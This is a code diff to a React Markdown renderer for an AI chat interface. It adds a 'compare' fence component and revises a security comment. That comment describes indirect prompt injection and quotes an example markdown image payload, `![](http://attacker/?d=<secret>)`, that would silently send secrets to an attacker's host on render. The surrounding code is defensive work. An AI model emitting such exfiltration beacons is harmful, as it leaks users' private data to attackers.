@@ -1,3 +1,4 @@
+import type { FileSource } from "@/lib/fileSource";
 import { remarkCitations } from "@/lib/remarkCitations";
 import { remarkEvidence } from "@/lib/remarkEvidence";
 import type { Citation, TurnEvidenceLedgerEntry } from "@/types/events";
@@ -18,6 +19,7 @@ import { DiagramBlock } from "./Diagram";
 import { EvidenceBadge } from "./EvidenceBadge";
 import { Favicon } from "./Favicon";
 import { SourceTooltip } from "./SourcePreview";
+import { CompareFence } from "./compare/CompareFence";
 import { rehypeCodeMeta } from "./rehypeCodeMeta";
 import { splitMarkdownBlocks } from "./streamingMarkdown";
 
@@ -225,6 +227,10 @@ function CitationChip({
 
 interface Props {
   content: string;
+  /** 会话 id — compare 围栏经工作区源加载图片时需要。 */
+  conversationId?: string | null;
+  /** 显式工作区源；与 conversationId 并存，显式源优先传给 compare 围栏。 */
+  fileSource?: FileSource | null;
   /** Web sources for this message; enables `[n]` (1..count) citation chips with
    * a hover preview of each source. */
   citations?: Citation[];
@@ -258,6 +264,8 @@ interface Props {
  */
 export const Markdown = memo(function Markdown({
   content,
+  conversationId = null,
+  fileSource = null,
   citations,
   citationToDisplay,
   isStreaming = false,
@@ -327,13 +335,23 @@ export const Markdown = memo(function Markdown({
           />
         );
       }
+      if (lang === "compare") {
+        return (
+          <CompareFence
+            body={nodeText(child)}
+            conversationId={conversationId}
+            fileSource={fileSource}
+          />
+        );
+      }
       return <CodeBlock {...props} />;
     };
 
     // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
     // image to a click-to-open link — never an auto-loading <img>. ReactMarkdown maps
     // `![](url)` to this component, and no rehype-raw is loaded, so raw <img> HTML in
-    // the reply is inert text — this is the ONLY path that can create an image element.
+    // the reply is inert text. The other image path is ```compare → WorkspaceImage,
+    // which only loads workspace-relative paths via FileSource.read (never the fence URL).
     // Without it, an indirect-injection payload like `![](http://attacker/?d=<secret>)`
     // would fetch on render = a no-click, silent exfil beacon for anything the model was
     // induced to encode in the URL. As a link, egress needs an explicit user click (the
@@ -406,6 +424,8 @@ export const Markdown = memo(function Markdown({
     toDisplay,
     isStreaming,
     evidence,
+    conversationId,
+    fileSource,
   ]);
 
   // While streaming, split into per-block memoized chunks so each finished block
